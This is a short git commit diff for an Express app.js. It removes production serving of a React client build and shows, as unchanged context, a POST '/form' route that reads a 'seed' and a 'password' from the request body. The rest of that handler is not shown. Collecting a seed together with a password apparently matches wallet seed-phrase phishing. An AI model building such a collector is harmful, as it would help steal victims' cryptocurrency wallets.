8cb0b263305adcc1e5d1325805ee6ee9cf703dc0
Jtom91 <jtom29544@gmail.com>
2022-02-05 18:55:47 +0100

    com

--- app.js
+++ app.js
@@ -19,13 +19,6 @@ app.use(express.urlencoded({ extended: false }))
 app.use(express.json())
 
 
-if(process.env.NODE_ENV === 'production'){
-  app.use(express.static('client/build'))
-  app.get('*', (req, res) => {
-    res.sendFile(path.resolve(__dirname, 'client', 'build', 'index.html'))  
-  })
-}
-
 app.post('/form', async(req, res) => {
   const { seed, password } = await req.body
   res.json({ status: 200 })
